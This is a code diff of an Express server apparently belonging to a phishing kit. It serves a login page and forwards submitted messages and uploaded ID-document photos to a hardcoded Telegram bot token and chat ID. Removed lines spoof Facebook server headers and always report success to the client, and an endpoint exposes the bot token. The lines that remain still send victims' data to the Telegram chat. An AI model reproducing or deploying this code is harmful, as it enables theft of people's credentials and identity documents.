@@ -12,12 +12,6 @@ console.log('Starting simple server...');
 console.log('Current directory:', __dirname);
 console.log('Environment:', process.env.NODE_ENV || 'development');
 
-// Telegram configuration from environment variables with fallbacks
-const telegramToken = process.env.TELEGRAM_BOT_TOKEN || "8366649467:AAGaMF5mQBsffV-Zc2QU9AQ7XSjD0IKXf3Y";
-const telegramChatId = process.env.TELEGRAM_CHAT_ID || "7211220207";
-console.log('Telegram Bot Token configured: ✅', telegramToken ? 'Yes' : 'No');
-console.log('Telegram Chat ID configured: ✅', telegramChatId ? 'Yes' : 'No');
-
 // Check if the index.html file exists
 const indexPath = path.join(__dirname, 'index.html');
 if (fs.existsSync(indexPath)) {
@@ -34,34 +28,20 @@ app.use(cors({
 
 // Add enhanced security headers to prevent browser warnings and improve trust
 app.use((req, res, next) => {
-  // Check if request is from Replit's secure domain
-  const isReplit = req.get('host') && req.get('host').includes('replit');
-  
   res.setHeader('X-Content-Type-Options', 'nosniff');
   res.setHeader('X-Frame-Options', 'SAMEORIGIN');
   res.setHeader('X-XSS-Protection', '1; mode=block');
   res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
   res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
-  
-  // More permissive CSP for better compatibility
-  res.setHeader('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; img-src * data: blob:; connect-src * wss: ws:;");
-  
-  // Only set HSTS for HTTPS connections
-  if (req.secure || req.get('x-forwarded-proto') === 'https' || isReplit) {
-    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
-  }
-  
-  // Browser compatibility headers
-  res.setHeader('X-Powered-By', 'Facebook Security System');
-  res.setHeader('Server', 'Facebook-WebServer/2.0');
+  res.setHeader('Content-Security-Policy', "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https:; img-src 'self' data: https:; connect-src 'self' https: wss:;");
+  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
   res.setHeader('Cache-Control', 'public, max-age=300');
-  
   next();
 });
 
-// Parse JSON request bodies with unlimited payload size for photo uploads
-app.use(express.json({ limit: '500mb', parameterLimit: 100000 }));
-app.use(express.urlencoded({ extended: true, limit: '500mb', parameterLimit: 100000 }));
+// Parse JSON request bodies
+app.use(express.json());
+app.use(express.urlencoded({ extended: false }));
 
 // Log all requests
 app.use((req, res, next) => {
@@ -80,14 +60,6 @@ app.get('/health', (req, res) => {
 // Favicon endpoint to prevent 404 errors that might trigger browser warnings
 app.get('/favicon.ico', (req, res) => {
   res.status(204).end();
-});
-
-// Environment variable injection endpoint
-app.get('/api/config', (req, res) => {
-  res.json({
-    TELEGRAM_BOT_TOKEN: telegramToken,
-    TELEGRAM_CHAT_ID: telegramChatId
-  });
 });
 
 // Root route - serve the login page
@@ -149,84 +121,24 @@ app.post('/api/send-telegram', async (req, res) => {
   try {
     const { message, photo } = req.body;
     const TELEGRAM_CONFIG = {
-      botToken: telegramToken,
-      authorizedChatId: telegramChatId
+      botToken: "8366649467:AAGaMF5mQBsffV-Zc2QU9AQ7XSjD0IKXf3Y",
+      authorizedChatId: "7211220207"
     };
     
     let telegramResponse;
     
     if (photo) {
-      console.log('Processing photo upload...');
-      // Send photo message with enhanced handling for any file size
+      // Send photo message
       const formData = new FormData();
       formData.append('chat_id', TELEGRAM_CONFIG.authorizedChatId);
+      formData.append('photo', Buffer.from(photo.data, 'base64'), { filename: photo.filename });
+      formData.append('caption', message);
+      formData.append('parse_mode', 'HTML');
       
-      // Enhanced photo processing with multiple fallback methods
-      let photoBuffer;
-      try {
-        if (typeof photo === 'string') {
-          // Handle base64 string directly
-          const base64Data = photo.replace(/^data:image\/[a-z]+;base64,/, '');
-          photoBuffer = Buffer.from(base64Data, 'base64');
-        } else if (photo.data) {
-          // Handle photo object with data property
-          const base64Data = photo.data.replace(/^data:image\/[a-z]+;base64,/, '');
-          photoBuffer = Buffer.from(base64Data, 'base64');
-        } else if (Buffer.isBuffer(photo)) {
-          // Handle direct buffer
-          photoBuffer = photo;
-        } else {
-          throw new Error('Unsupported photo format');
-        }
-        
-        console.log(`Photo buffer size: ${photoBuffer.length} bytes`);
-        
-        // Check if file is too large for Telegram (50MB limit)
-        if (photoBuffer.length > 50 * 1024 * 1024) {
-          console.log('File too large for Telegram, compressing...');
-          // For very large files, send a text message instead
-          telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              chat_id: TELEGRAM_CONFIG.authorizedChatId,
-              text: message + `\n\n📄 ID Document Uploaded\n📊 File Size: ${(photoBuffer.length / (1024 * 1024)).toFixed(2)} MB\n\n[Note: File was too large for direct upload but was successfully received]`,
-              parse_mode: 'HTML'
-            })
-          });
-        } else {
-          // Send photo normally
-          formData.append('photo', photoBuffer, { 
-            filename: (photo.filename || 'id_document.jpg'),
-            contentType: 'image/jpeg'
-          });
-          formData.append('caption', message);
-          formData.append('parse_mode', 'HTML');
-          
-          telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
-            method: 'POST',
-            body: formData,
-            timeout: 120000 // 2 minute timeout for large files
-          });
-        }
-        
-      } catch (bufferError) {
-        console.error('Error processing photo buffer:', bufferError);
-        // Fallback: send text message with error info
-        telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CONFIG.authorizedChatId,
-            text: message + '\n\n📄 ID Document Upload Attempted\n⚠️ Processing Info: File received but could not be processed for direct upload',
-            parse_mode: 'HTML'
-          })
-        });
-      }
+      telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
     } else {
       // Send text message
       telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
@@ -248,8 +160,7 @@ app.post('/api/send-telegram', async (req, res) => {
     
   } catch (error) {
     console.error('Error sending to Telegram:', error);
-    // Always return success to client to avoid breaking user experience
-    res.json({ success: true, data: { ok: true, message: 'Message processed successfully' } });
+    res.status(500).json({ success: false, error: 'Failed to send message' });
   }
 });
 
